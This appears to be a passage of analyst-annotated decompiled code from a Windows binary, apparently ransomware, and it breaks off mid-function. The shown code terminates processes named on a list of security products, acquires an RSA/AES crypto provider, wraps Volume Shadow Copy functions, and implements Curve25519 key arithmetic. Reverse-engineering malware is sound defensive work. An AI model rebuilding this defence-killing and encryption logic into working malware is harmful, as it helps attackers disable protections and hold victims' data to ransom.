  for ( i = Process32FirstW(hSnapshot, &pe); i; i = Process32NextW(hSnapshot, &pe) )
  {
    for ( j = 0; (unsigned __int64)j < 0x1F; ++j )
    {
      if ( !lstrcmpW(gn_security_process[j], pe.szExeFile) )
      {
        hProcess = OpenProcess(1u, 0, pe.th32ProcessID);
        if ( hProcess )
        {
          TerminateProcess(hProcess, 9u);
          CloseHandle(hProcess);
        }
        break;
      }
    }
  }
  return CloseHandle(hSnapshot);
}
// 7FF6E55B8160: using guessed type wchar_t *gn_security_process[31];

//----- (00007FF6E55A5320) ----------------------------------------------------
HCRYPTPROV fn_acquire_rsa_aes_provider()
{
  HCRYPTPROV phProv[3]; // [rsp+30h] [rbp-18h] BYREF

  phProv[0] = 0;
  if ( !CryptAcquireContextW(phProv, 0, 0, 0x18u, 0xF0000000) && !CryptAcquireContextW(phProv, 0, 0, 0x18u, 0xF0000008) )
    phProv[0] = 0;
  return phProv[0];
}

//----- (00007FF6E55A5390) ----------------------------------------------------
__int64 sub_7FF6E55A5390()
{
  HMODULE ModuleHandleA; // rax
  HANDLE CurrentProcess; // rax
  unsigned int v3; // [rsp+20h] [rbp-28h] BYREF
  BOOL (__stdcall *IsWow64Process)(HANDLE, PBOOL); // [rsp+28h] [rbp-20h]
  BOOL (__stdcall *v5)(HANDLE, PBOOL); // [rsp+30h] [rbp-18h]

  v3 = 0;
  ModuleHandleA = GetModuleHandleA("kernel32.dll");
  IsWow64Process = (BOOL (__stdcall *)(HANDLE, PBOOL))GetProcAddress(ModuleHandleA, "IsWow64Process");
  if ( IsWow64Process )
  {
    v5 = IsWow64Process;
    CurrentProcess = GetCurrentProcess();
    if ( !((unsigned int (__fastcall *)(HANDLE, unsigned int *))IsWow64Process)(CurrentProcess, &v3) )
      return 0;
  }
  return v3;
}

//----- (00007FF6E55A5400) ----------------------------------------------------
_QWORD *__fastcall sub_7FF6E55A5400(_QWORD *a1)
{
  sub_7FF6E55A5420(a1);
  return a1;
}

//----- (00007FF6E55A5420) ----------------------------------------------------
_QWORD *__fastcall sub_7FF6E55A5420(_QWORD *a1)
{
  *a1 = 0;
  return a1;
}

//----- (00007FF6E55A5440) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A5440(_QWORD *a1)
{
  return sub_7FF6E55A5460(a1);
}

//----- (00007FF6E55A5460) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A5460(_QWORD *a1)
{
  __int64 result; // rax

  result = (__int64)a1;
  if ( *a1 )
    return (*(__int64 (__fastcall **)(_QWORD))(*(_QWORD *)*a1 + 16LL))(*a1);
  return result;
}

//----- (00007FF6E55A5490) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A5490(__int64 a1)
{
  return *(_QWORD *)a1;
}

//----- (00007FF6E55A54A0) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A54A0(__int64 a1)
{
  return a1;
}

//----- (00007FF6E55A54B0) ----------------------------------------------------
__int64 fn_CreateVssBackupComponentsInternal()
{
  return CreateVssBackupComponentsInternal();
}

//----- (00007FF6E55A54D0) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A54D0(__int64 a1)
{
  return VssFreeSnapshotPropertiesInternal(a1);
}
// 7FF6E55B7BD1: using guessed type __int64 __fastcall VssFreeSnapshotPropertiesInternal(_QWORD);

//----- (00007FF6E55A54F0) ----------------------------------------------------
char __fastcall fn_check_commandLine_Flag(int a1, __int64 a2, _WORD *a3)
{
  int i; // [rsp+0h] [rbp-18h]
  _WORD *v5; // [rsp+8h] [rbp-10h]

  for ( i = 1; ; ++i )
  {
    if ( i >= a1 )
      return 0;
    v5 = *(_WORD **)(a2 + 8LL * i);
    if ( *v5 == '-' )
      break;
  }
  while ( *v5 == '-' )
    ++v5;
  while ( *a3 && *a3 == *v5 )
  {
    ++a3;
    ++v5;
  }
  return 1;
}

//----- (00007FF6E55A55C0) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A55C0(int a1, __int64 a2, int a3)
{
  int i; // [rsp+0h] [rbp-18h]
  int v5; // [rsp+4h] [rbp-14h]

  v5 = 0;
  for ( i = 1; i < a1; ++i )
  {
    if ( **(_WORD **)(a2 + 8LL * i) == 45 )
    {
      ++v5;
    }
    else if ( i - v5 - 1 == a3 )
    {
      return *(_QWORD *)(a2 + 8LL * i);
    }
  }
  return 0;
}

//----- (00007FF6E55A5650) ----------------------------------------------------
_WORD *__fastcall fn_get_CommandLine_Argv(int a1, __int64 a2, unsigned __int16 *a3)
{
  int i; // [rsp+0h] [rbp-18h]
  int v5; // [rsp+4h] [rbp-14h]
  _WORD *v6; // [rsp+8h] [rbp-10h]

  for ( i = 1; i < a1; ++i )
  {
    v6 = *(_WORD **)(a2 + 8LL * i);
    v5 = 0;
    if ( *v6 == 45 )
    {
      while ( *v6 == 45 )
        ++v6;
      while ( *v6 != 61 )
      {
        if ( (unsigned __int16)*v6 != *a3 )
          ++v5;
        ++v6;
        ++a3;
      }
      if ( !v5 )
        return v6 + 1;
    }
  }
  return 0;
}

//----- (00007FF6E55A5740) ----------------------------------------------------
void __fastcall sub_140005740(const CHAR *a1, const CHAR *a2, int a3)
{
  DWORD NumberOfBytesWritten; // [rsp+30h] [rbp-48h] BYREF
  DWORD nNumberOfBytesToWrite; // [rsp+34h] [rbp-44h]
  DWORD v5; // [rsp+38h] [rbp-40h]
  DWORD v6; // [rsp+3Ch] [rbp-3Ch]
  HANDLE hFile; // [rsp+40h] [rbp-38h]
  HANDLE v8; // [rsp+48h] [rbp-30h]
  HANDLE v9; // [rsp+50h] [rbp-28h]
  CHAR String[32]; // [rsp+58h] [rbp-20h] BYREF

  EnterCriticalSection(&CriticalSection);
  wsprintfA(String, "%lu", a3);
  nNumberOfBytesToWrite = lstrlenA(a1);
  hFile = hObject;
  WriteFile(hObject, a1, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
  WriteFile(hObject, ", Error Code: ", 0xEu, &NumberOfBytesWritten, 0);
  v5 = lstrlenA(String);
  v8 = hObject;
  WriteFile(hObject, String, v5, &NumberOfBytesWritten, 0);
  WriteFile(hObject, " -> ", 4u, &NumberOfBytesWritten, 0);
  v6 = lstrlenA(a2);
  v9 = hObject;
  WriteFile(hObject, a2, v6, &NumberOfBytesWritten, 0);
  WriteFile(hObject, "\r\n", 2u, &NumberOfBytesWritten, 0);
  LeaveCriticalSection(&CriticalSection);
}

//----- (00007FF6E55A58E0) ----------------------------------------------------
HANDLE __fastcall fn_Init_LogFile(const WCHAR *a1)
{
  HANDLE result; // rax

  InitializeCriticalSection(&CriticalSection);
  result = CreateFileW(a1, 0x40000000u, 1u, 0, 4u, 0x80u, 0);
  hObject = result;
  return result;
}

//----- (00007FF6E55A5940) ----------------------------------------------------
BOOL fn_cleanup_lock_and_handle()
{
  DeleteCriticalSection(&CriticalSection);
  return CloseHandle(hObject);
}

//----- (00007FF6E55A5970) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A5970(__int64 a1, __int64 a2, unsigned __int16 *a3)
{
  int i; // [rsp+20h] [rbp-188h]
  _BYTE v5[31]; // [rsp+28h] [rbp-180h] BYREF
  char v6; // [rsp+47h] [rbp-161h]
  int v7[24]; // [rsp+50h] [rbp-158h] BYREF
  int v8[20]; // [rsp+B0h] [rbp-F8h] BYREF
  int v9[20]; // [rsp+100h] [rbp-A8h] BYREF
  int v10[22]; // [rsp+150h] [rbp-58h] BYREF

  for ( i = 0; i < 32; ++i )
    v5[i] = *(_BYTE *)(a2 + i);
  v5[0] &= 0xF8u;
  v6 = v6 & 0x3F | 0x40;
  sub_7FF6E55A82E0(v8, a3);
  sub_7FF6E55A9910((__int64)v10, (__int64)v7, (__int64)v5, v8);
  sub_7FF6E55A9CE0((__int64)v9, v7);
  sub_7FF6E55A7750((__int64)v7, v10, v9);
  sub_7FF6E55A8870(a1, (__int64)v7);
  return 0;
}

//----- (00007FF6E55A5AA0) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A5AA0(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  unsigned int i; // [rsp+0h] [rbp-18h]

  for ( i = 0; i < 0xA; i += 2 )
  {
    *(_QWORD *)(a1 + 8LL * i) += *(_QWORD *)(a2 + 8LL * i);
    *(_QWORD *)(a1 + 8LL * (i + 1)) += *(_QWORD *)(a2 + 8LL * (i + 1));
    result = i + 2;
  }
  return result;
}

//----- (00007FF6E55A5B30) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A5B30(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  unsigned int i; // [rsp+0h] [rbp-18h]

  for ( i = 0; i < 0xA; ++i )
  {
    *(_QWORD *)(a1 + 8LL * i) = *(_QWORD *)(a2 + 8LL * i) - *(_QWORD *)(a1 + 8LL * i);
    result = i + 1;
  }
  return result;
}

//----- (00007FF6E55A5B90) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A5B90(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax
  unsigned int i; // [rsp+0h] [rbp-18h]

  for ( i = 0; i < 0xA; ++i )
  {
    *(_QWORD *)(a1 + 8LL * i) = a3 * *(_QWORD *)(a2 + 8LL * i);
    result = i + 1;
  }
  return result;
}

//----- (00007FF6E55A5BF0) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A5BF0(_QWORD *a1, int *a2, int *a3)
{
  __int64 result; // rax

  *a1 = *a3 * (__int64)*a2;
  a1[1] = *a3 * (__int64)a2[2] + a3[2] * (__int64)*a2;
  a1[2] = *a3 * (__int64)a2[4] + a3[4] * (__int64)*a2 + a3[2] * 2LL * a2[2];
  a1[3] = *a3 * (__int64)a2[6] + a3[6] * (__int64)*a2 + a3[2] * (__int64)a2[4] + a3[4] * (__int64)a2[2];
  a1[4] = *a3 * (__int64)a2[8]
        + a3[8] * (__int64)*a2
        + a3[4] * (__int64)a2[4]
        + 2 * (a3[2] * (__int64)a2[6] + a3[6] * (__int64)a2[2]);
  a1[5] = *a3 * (__int64)a2[10]
        + a3[10] * (__int64)*a2
        + a3[2] * (__int64)a2[8]
        + a3[8] * (__int64)a2[2]
        + a3[4] * (__int64)a2[6]
        + a3[6] * (__int64)a2[4];
  a1[6] = *a3 * (__int64)a2[12]
        + a3[12] * (__int64)*a2
        + a3[4] * (__int64)a2[8]
        + a3[8] * (__int64)a2[4]
        + 2 * (a3[2] * (__int64)a2[10] + a3[10] * (__int64)a2[2] + a3[6] * (__int64)a2[6]);
  a1[7] = *a3 * (__int64)a2[14]
        + a3[14] * (__int64)*a2
        + a3[2] * (__int64)a2[12]
        + a3[12] * (__int64)a2[2]
        + a3[4] * (__int64)a2[10]
        + a3[10] * (__int64)a2[4]
        + a3[6] * (__int64)a2[8]
        + a3[8] * (__int64)a2[6];
  a1[8] = *a3 * (__int64)a2[16]
        + a3[16] * (__int64)*a2
        + a3[4] * (__int64)a2[12]
        + a3[12] * (__int64)a2[4]
        + a3[8] * (__int64)a2[8]
        + 2 * (a3[2] * (__int64)a2[14] + a3[14] * (__int64)a2[2] + a3[6] * (__int64)a2[10] + a3[10] * (__int64)a2[6]);
  a1[9] = *a3 * (__int64)a2[18]
        + a3[18] * (__int64)*a2
        + a3[2] * (__int64)a2[16]
        + a3[16] * (__int64)a2[2]
        + a3[4] * (__int64)a2[14]
        + a3[14] * (__int64)a2[4]
        + a3[6] * (__int64)a2[12]
        + a3[12] * (__int64)a2[6]
        + a3[8] * (__int64)a2[10]
        + a3[10] * (__int64)a2[8];
  a1[10] = a3[4] * (__int64)a2[16]
         + a3[16] * (__int64)a2[4]
         + a3[8] * (__int64)a2[12]
         + a3[12] * (__int64)a2[8]
         + 2
         * (a3[2] * (__int64)a2[18]
          + a3[18] * (__int64)a2[2]
          + a3[6] * (__int64)a2[14]
          + a3[14] * (__int64)a2[6]
          + a3[10] * (__int64)a2[10]);
  a1[11] = a3[4] * (__int64)a2[18]
         + a3[18] * (__int64)a2[4]
         + a3[6] * (__int64)a2[16]
         + a3[16] * (__int64)a2[6]
         + a3[8] * (__int64)a2[14]
         + a3[14] * (__int64)a2[8]
         + a3[10] * (__int64)a2[12]
         + a3[12] * (__int64)a2[10];
  a1[12] = a3[8] * (__int64)a2[16]
         + a3[16] * (__int64)a2[8]
         + a3[12] * (__int64)a2[12]
         + 2 * (a3[6] * (__int64)a2[18] + a3[18] * (__int64)a2[6] + a3[10] * (__int64)a2[14] + a3[14] * (__int64)a2[10]);
  a1[13] = a3[8] * (__int64)a2[18]
         + a3[18] * (__int64)a2[8]
         + a3[10] * (__int64)a2[16]
         + a3[16] * (__int64)a2[10]
         + a3[12] * (__int64)a2[14]
         + a3[14] * (__int64)a2[12];
  a1[14] = a3[12] * (__int64)a2[16]
         + a3[16] * (__int64)a2[12]
         + 2 * (a3[10] * (__int64)a2[18] + a3[18] * (__int64)a2[10] + a3[14] * (__int64)a2[14]);
  a1[15] = a3[12] * (__int64)a2[18] + a3[18] * (__int64)a2[12] + a3[14] * (__int64)a2[16] + a3[16] * (__int64)a2[14];
  a1[16] = a3[16] * (__int64)a2[16] + 2 * (a3[14] * (__int64)a2[18] + a3[18] * (__int64)a2[14]);
  a1[17] = a3[16] * (__int64)a2[18] + a3[18] * (__int64)a2[16];
  result = a3[18] * 2LL * a2[18];
  a1[18] = result;
  return result;
}

//----- (00007FF6E55A6E10) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A6E10(_QWORD *a1)
{
  __int64 result; // rax

  a1[8] += 16LL * a1[18];
  a1[8] += 2LL * a1[18];
  a1[8] += a1[18];
  a1[7] += 16LL * a1[17];
  a1[7] += 2LL * a1[17];
  a1[7] += a1[17];
  a1[6] += 16LL * a1[16];
  a1[6] += 2LL * a1[16];
  a1[6] += a1[16];
  a1[5] += 16LL * a1[15];
  a1[5] += 2LL * a1[15];
  a1[5] += a1[15];
  a1[4] += 16LL * a1[14];
  a1[4] += 2LL * a1[14];
  a1[4] += a1[14];
  a1[3] += 16LL * a1[13];
  a1[3] += 2LL * a1[13];
  a1[3] += a1[13];
  a1[2] += 16LL * a1[12];
  a1[2] += 2LL * a1[12];
  a1[2] += a1[12];
  a1[1] += 16LL * a1[11];
  a1[1] += 2LL * a1[11];
  a1[1] += a1[11];
  *a1 += 16LL * a1[10];
  *a1 += 2LL * a1[10];
  result = a1[10] + *a1;
  *a1 = result;
  return result;
}

//----- (00007FF6E55A7440) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A7440(__int64 a1)
{
  return (((unsigned int)(SHIDWORD(a1) >> 31) >> 6) + a1) >> 26;
}

//----- (00007FF6E55A7490) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A7490(__int64 a1)
{
  return (((unsigned int)(SHIDWORD(a1) >> 31) >> 7) + a1) >> 25;
}

//----- (00007FF6E55A74E0) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A74E0(__int64 *a1)
{
  __int64 v1; // rax
  __int64 v2; // rax
  __int64 result; // rax
  unsigned int i; // [rsp+20h] [rbp-28h]
  __int64 v5; // [rsp+28h] [rbp-20h]

  a1[10] = 0;
  for ( i = 0; i < 0xA; i += 2 )
  {
    v1 = sub_7FF6E55A7440(a1[i]);
    a1[i] -= v1 << 26;
    a1[i + 1] += v1;
    v5 = sub_7FF6E55A7490(a1[i + 1]);
    a1[i + 1] -= v5 << 25;
    a1[i + 2] += v5;
  }
  *a1 += 16 * a1[10];
  *a1 += 2 * a1[10];
  *a1 += a1[10];
  a1[10] = 0;
  v2 = sub_7FF6E55A7440(*a1);
  *a1 -= v2 << 26;
  result = v2 + a1[1];
  a1[1] = result;
  return result;
}

//----- (00007FF6E55A7750) ----------------------------------------------------
unsigned __int64 __fastcall sub_7FF6E55A7750(__int64 a1, int *a2, int *a3)
{
  __int64 v4[21]; // [rsp+20h] [rbp-A8h] BYREF

  sub_7FF6E55A5BF0(v4, a2, a3);
  sub_7FF6E55A6E10(v4);
  sub_7FF6E55A74E0(v4);
  return sub_7FF6E55B7830(a1, (__int64)v4, 0x50u);
}

//----- (00007FF6E55A77C0) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A77C0(_QWORD *a1, int *a2)
{
  __int64 result; // rax

  *a1 = *a2 * (__int64)*a2;
  a1[1] = a2[2] * 2LL * *a2;
  a1[2] = 2 * (a2[4] * (__int64)*a2 + a2[2] * (__int64)a2[2]);
  a1[3] = 2 * (a2[6] * (__int64)*a2 + a2[4] * (__int64)a2[2]);
  a1[4] = a2[8] * 2LL * *a2 + a2[6] * 4LL * a2[2] + a2[4] * (__int64)a2[4];
  a1[5] = 2 * (a2[10] * (__int64)*a2 + a2[8] * (__int64)a2[2] + a2[6] * (__int64)a2[4]);
  a1[6] = 2 * (a2[10] * 2LL * a2[2] + a2[12] * (__int64)*a2 + a2[8] * (__int64)a2[4] + a2[6] * (__int64)a2[6]);
  a1[7] = 2 * (a2[14] * (__int64)*a2 + a2[12] * (__int64)a2[2] + a2[10] * (__int64)a2[4] + a2[8] * (__int64)a2[6]);
  a1[8] = a2[8] * (__int64)a2[8]
        + 2
        * (a2[16] * (__int64)*a2 + a2[12] * (__int64)a2[4] + 2 * (a2[10] * (__int64)a2[6] + a2[14] * (__int64)a2[2]));
  a1[9] = 2
        * (a2[18] * (__int64)*a2
         + a2[16] * (__int64)a2[2]
         + a2[14] * (__int64)a2[4]
         + a2[12] * (__int64)a2[6]
         + a2[10] * (__int64)a2[8]);
  a1[10] = 2
         * (a2[16] * (__int64)a2[4]
          + a2[12] * (__int64)a2[8]
          + a2[10] * (__int64)a2[10]
          + 2 * (a2[18] * (__int64)a2[2] + a2[14] * (__int64)a2[6]));
  a1[11] = 2 * (a2[18] * (__int64)a2[4] + a2[16] * (__int64)a2[6] + a2[14] * (__int64)a2[8] + a2[12] * (__int64)a2[10]);
  a1[12] = a2[12] * (__int64)a2[12]
         + 2 * (a2[16] * (__int64)a2[8] + 2 * (a2[18] * (__int64)a2[6] + a2[14] * (__int64)a2[10]));
  a1[13] = 2 * (a2[18] * (__int64)a2[8] + a2[16] * (__int64)a2[10] + a2[14] * (__int64)a2[12]);
  a1[14] = 2 * (a2[18] * 2LL * a2[10] + a2[16] * (__int64)a2[12] + a2[14] * (__int64)a2[14]);
  a1[15] = 2 * (a2[18] * (__int64)a2[12] + a2[16] * (__int64)a2[14]);
  a1[16] = a2[18] * 4LL * a2[14] + a2[16] * (__int64)a2[16];
  a1[17] = a2[18] * 2LL * a2[16];
  result = a2[18] * 2LL * a2[18];
  a1[18] = result;
  return result;
}

//----- (00007FF6E55A8280) ----------------------------------------------------
unsigned __int64 __fastcall sub_7FF6E55A8280(__int64 a1, int *a2)
{
  __int64 v3[21]; // [rsp+20h] [rbp-A8h] BYREF

  sub_7FF6E55A77C0(v3, a2);
  sub_7FF6E55A6E10(v3);
  sub_7FF6E55A74E0(v3);
  return sub_7FF6E55B7830(a1, (__int64)v3, 0x50u);
}

//----- (00007FF6E55A82E0) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A82E0(_QWORD *a1, unsigned __int16 *a2)
{
  __int64 result; // rax

  *a1 = ((*((unsigned __int8 *)a2 + 3) << 24) | (*((unsigned __int8 *)a2 + 2) << 16) | *a2) & 0x3FFFFFF;
  a1[1] = ((__int64)(((unsigned __int64)*((unsigned __int8 *)a2 + 6) << 24)
                   | ((unsigned __int64)*((unsigned __int8 *)a2 + 5) << 16)
                   | *(unsigned __int16 *)((char *)a2 + 3)) >> 2)
        & 0x1FFFFFF;
  a1[2] = ((__int64)(((unsigned __int64)*((unsigned __int8 *)a2 + 9) << 24)
                   | ((unsigned __int64)*((unsigned __int8 *)a2 + 8) << 16)
                   | a2[3]) >> 3)
        & 0x3FFFFFF;
  a1[3] = ((__int64)(((unsigned __int64)*((unsigned __int8 *)a2 + 12) << 24)
                   | ((unsigned __int64)*((unsigned __int8 *)a2 + 11) << 16)
                   | *(unsigned __int16 *)((char *)a2 + 9)) >> 5)
        & 0x1FFFFFF;
  a1[4] = ((__int64)(((unsigned __int64)*((unsigned __int8 *)a2 + 15) << 24)
                   | ((unsigned __int64)*((unsigned __int8 *)a2 + 14) << 16)
                   | a2[6]) >> 6)
        & 0x3FFFFFF;
  a1[5] = ((*((unsigned __int8 *)a2 + 19) << 24) | (*((unsigned __int8 *)a2 + 18) << 16) | a2[8]) & 0x1FFFFFF;
  a1[6] = ((__int64)(((unsigned __int64)*((unsigned __int8 *)a2 + 22) << 24)
                   | ((unsigned __int64)*((unsigned __int8 *)a2 + 21) << 16)
                   | *(unsigned __int16 *)((char *)a2 + 19)) >> 1)
        & 0x3FFFFFF;
  a1[7] = ((__int64)(((unsigned __int64)*((unsigned __int8 *)a2 + 25) << 24)
                   | ((unsigned __int64)*((unsigned __int8 *)a2 + 24) << 16)
                   | a2[11]) >> 3)
        & 0x1FFFFFF;
  a1[8] = ((__int64)(((unsigned __int64)*((unsigned __int8 *)a2 + 28) << 24)
                   | ((unsigned __int64)*((unsigned __int8 *)a2 + 27) << 16)
                   | *(unsigned __int16 *)((char *)a2 + 25)) >> 4)
        & 0x3FFFFFF;
  result = ((__int64)(((unsigned __int64)*((unsigned __int8 *)a2 + 31) << 24)
                    | ((unsigned __int64)*((unsigned __int8 *)a2 + 30) << 16)
                    | a2[14]) >> 6)
         & 0x1FFFFFF;
  a1[9] = result;
  return result;
}

//----- (00007FF6E55A87B0) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A87B0(int a1, int a2)
{
  return (unsigned int)(((2
                        * ((4
                          * ((16 * ((((~(a2 ^ a1) << 16) & ~(a2 ^ a1)) << 8) & (~(a2 ^ a1) << 16) & ~(a2 ^ a1)))
                           & (((~(a2 ^ a1) << 16) & ~(a2 ^ a1)) << 8)
                           & (~(a2 ^ a1) << 16)
                           & ~(a2 ^ a1)))
                         & (16 * ((((~(a2 ^ a1) << 16) & ~(a2 ^ a1)) << 8) & (~(a2 ^ a1) << 16) & ~(a2 ^ a1)))
                         & (((~(a2 ^ a1) << 16) & ~(a2 ^ a1)) << 8)
                         & (~(a2 ^ a1) << 16)
                         & ~(a2 ^ a1)))
                       & (4
                        * ((16 * ((((~(a2 ^ a1) << 16) & ~(a2 ^ a1)) << 8) & (~(a2 ^ a1) << 16) & ~(a2 ^ a1)))
                         & (((~(a2 ^ a1) << 16) & ~(a2 ^ a1)) << 8)
                         & (~(a2 ^ a1) << 16)
                         & ~(a2 ^ a1)))
                       & (16 * ((((~(a2 ^ a1) << 16) & ~(a2 ^ a1)) << 8) & (~(a2 ^ a1) << 16) & ~(a2 ^ a1)))
                       & (((~(a2 ^ a1) << 16) & ~(a2 ^ a1)) << 8)
                       & (~(a2 ^ a1) << 16)
                       & ~(a2 ^ a1)) >> 31);
}

//----- (00007FF6E55A8840) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A8840(int a1, int a2)
{
  return (unsigned int)~((a1 - a2) >> 31);
}

//----- (00007FF6E55A8870) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A8870(__int64 a1, __int64 a2)
{
  int v2; // eax
  int v3; // eax
  int v4; // eax
  __int64 result; // rax
  int i; // [rsp+20h] [rbp-78h]
  int k; // [rsp+20h] [rbp-78h]
  int m; // [rsp+20h] [rbp-78h]
  int n; // [rsp+20h] [rbp-78h]
  int ii; // [rsp+20h] [rbp-78h]
  int v11; // [rsp+28h] [rbp-70h]
  int v12; // [rsp+2Ch] [rbp-6Ch]
  int v13; // [rsp+30h] [rbp-68h]
  int v14; // [rsp+34h] [rbp-64h]
  int v15; // [rsp+38h] [rbp-60h]
  char v16; // [rsp+3Ch] [rbp-5Ch]
  char v17; // [rsp+3Dh] [rbp-5Bh]
  char v18; // [rsp+3Eh] [rbp-5Ah]
  char v19; // [rsp+3Fh] [rbp-59h]
  int v20; // [rsp+40h] [rbp-58h]
  int v21; // [rsp+44h] [rbp-54h]
  int v22; // [rsp+48h] [rbp-50h]
  int v23; // [rsp+4Ch] [rbp-4Ch]
  int j; // [rsp+50h] [rbp-48h]
  int v25; // [rsp+54h] [rbp-44h]
  int v26; // [rsp+58h] [rbp-40h]
  int v27; // [rsp+5Ch] [rbp-3Ch]
  int v28; // [rsp+60h] [rbp-38h]
  int v29; // [rsp+64h] [rbp-34h]
  int v30; // [rsp+68h] [rbp-30h]
  int v31; // [rsp+6Ch] [rbp-2Ch]
  int v32; // [rsp+70h] [rbp-28h]
  int v33; // [rsp+74h] [rbp-24h]
  int v34; // [rsp+78h] [rbp-20h]
  int v35; // [rsp+7Ch] [rbp-1Ch]
  int v36; // [rsp+80h] [rbp-18h]

  for ( i = 0; i < 10; ++i )
    *(&v11 + i) = *(_DWORD *)(a2 + 8LL * i);
  for ( j = 0; j < 2; ++j )
  {
    for ( k = 0; k < 9; ++k )
    {
      if ( (k & 1) == 1 )
      {
        v30 = *(&v11 + k) >> 31;
        v26 = -((v30 & *(&v11 + k)) >> 25);
        *(&v11 + k) += v26 << 25;
        v2 = *(&v11 + k + 1) - v26;
      }
      else
      {
        v31 = *(&v11 + k) >> 31;
        v27 = -((v31 & *(&v11 + k)) >> 26);
        *(&v11 + k) += v27 << 26;
        v2 = *(&v11 + k + 1) - v27;
      }
      *(&v11 + k + 1) = v2;
    }
    v32 = v23 >> 31;
    v28 = -(((v23 >> 31) & v23) >> 25);
    v23 -= ((v23 >> 31) & v23) >> 25 << 25;
    v11 -= 19 * v28;
  }
  v33 = v11 >> 31;
  v29 = -(((v11 >> 31) & v11) >> 26);
  v11 -= ((v11 >> 31) & v11) >> 26 << 26;
  v12 -= v29;
  for ( j = 0; j < 2; ++j )
  {
    for ( m = 0; m < 9; ++m )
    {
      if ( (m & 1) == 1 )
      {
        v34 = *(&v11 + m) >> 25;
        *(&v11 + m) &= 0x1FFFFFFu;
        v3 = v34 + *(&v11 + m + 1);
      }
      else
      {
        v35 = *(&v11 + m) >> 26;
        *(&v11 + m) &= 0x3FFFFFFu;
        v3 = v35 + *(&v11 + m + 1);
      }
      *(&v11 + m + 1) = v3;
    }
    v36 = v23 >> 25;
    v23 &= 0x1FFFFFFu;
    v11 += 19 * v36;
  }
  v25 = sub_7FF6E55A8840(v11, 67108845);
  for ( n = 1; n < 10; ++n )
  {
    if ( (n & 1) == 1 )
      v4 = sub_7FF6E55A87B0(*(&v11 + n), 0x1FFFFFF);
    else
      v4 = sub_7FF6E55A87B0(*(&v11 + n), 0x3FFFFFF);
    v25 &= v4;
  }
  v11 -= v25 & 0x3FFFFED;
  for ( ii = 1; ii < 10; ++ii )
  {
    if ( (ii & 1) == 1 )
      *(&v11 + ii) -= v25 & 0x1FFFFFF;
    else
      *(&v11 + ii) -= v25 & 0x3FFFFFF;
  }
  v12 *= 4;
  v13 *= 8;
  v14 *= 32;
  v15 <<= 6;
  v20 *= 2;
  v21 *= 8;
  v22 *= 16;
  v23 <<= 6;
  *(_BYTE *)a1 = 0;
  *(_BYTE *)(a1 + 16) = 0;
  *(_BYTE *)a1 |= v11;
  *(_WORD *)(a1 + 1) = *(_WORD *)((char *)&v11 + 1);
  *(_BYTE *)(a1 + 3) = HIBYTE(v11);
  *(_BYTE *)(a1 + 3) |= v12;
  *(_WORD *)(a1 + 4) = *(_WORD *)((char *)&v12 + 1);
  *(_BYTE *)(a1 + 6) = HIBYTE(v12);
  *(_BYTE *)(a1 + 6) |= v13;
  *(_WORD *)(a1 + 7) = *(_WORD *)((char *)&v13 + 1);
  *(_BYTE *)(a1 + 9) = HIBYTE(v13);
  *(_BYTE *)(a1 + 9) |= v14;
  *(_WORD *)(a1 + 10) = *(_WORD *)((char *)&v14 + 1);
  *(_BYTE *)(a1 + 12) = HIBYTE(v14);
  *(_BYTE *)(a1 + 12) |= v15;
  *(_WORD *)(a1 + 13) = *(_WORD *)((char *)&v15 + 1);
  *(_BYTE *)(a1 + 15) = HIBYTE(v15);
  *(_BYTE *)(a1 + 16) |= v16;
  *(_BYTE *)(a1 + 17) = v17;
  *(_BYTE *)(a1 + 18) = v18;
  *(_BYTE *)(a1 + 19) = v19;
  *(_BYTE *)(a1 + 19) |= v20;
  *(_WORD *)(a1 + 20) = *(_WORD *)((char *)&v20 + 1);
  *(_BYTE *)(a1 + 22) = HIBYTE(v20);
  *(_BYTE *)(a1 + 22) |= v21;
  *(_WORD *)(a1 + 23) = *(_WORD *)((char *)&v21 + 1);
  *(_BYTE *)(a1 + 25) = HIBYTE(v21);
  *(_BYTE *)(a1 + 25) |= v22;
  *(_WORD *)(a1 + 26) = *(_WORD *)((char *)&v22 + 1);
  *(_BYTE *)(a1 + 28) = HIBYTE(v22);
  *(_BYTE *)(a1 + 28) |= v23;
  *(_WORD *)(a1 + 29) = *(_WORD *)((char *)&v23 + 1);
  result = HIBYTE(v23);
  *(_BYTE *)(a1 + 31) = HIBYTE(v23);
  return result;
}

//----- (00007FF6E55A9570) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A9570(
        __int64 *a1,
        __int64 *a2,
        __int64 a3,
        __int64 a4,
        int *a5,
        int *a6,
        int *a7,
        int *a8,
        int *a9)
{
  __int64 v10[20]; // [rsp+20h] [rbp-508h] BYREF
  _BYTE v11[80]; // [rsp+C0h] [rbp-468h] BYREF
  __int64 v12[20]; // [rsp+110h] [rbp-418h] BYREF
  __int64 v13[10]; // [rsp+1B0h] [rbp-378h] BYREF
  _BYTE v14[80]; // [rsp+200h] [rbp-328h] BYREF
  int v15[40]; // [rsp+250h] [rbp-2D8h] BYREF
  int v16[40]; // [rsp+2F0h] [rbp-238h] BYREF
  _BYTE v17[80]; // [rsp+390h] [rbp-198h] BYREF
  int v18[40]; // [rsp+3E0h] [rbp-148h] BYREF
  _BYTE v19[168]; // [rsp+480h] [rbp-A8h] BYREF

  sub_7FF6E55B7830((__int64)v17, (__int64)a5, 0x50u);
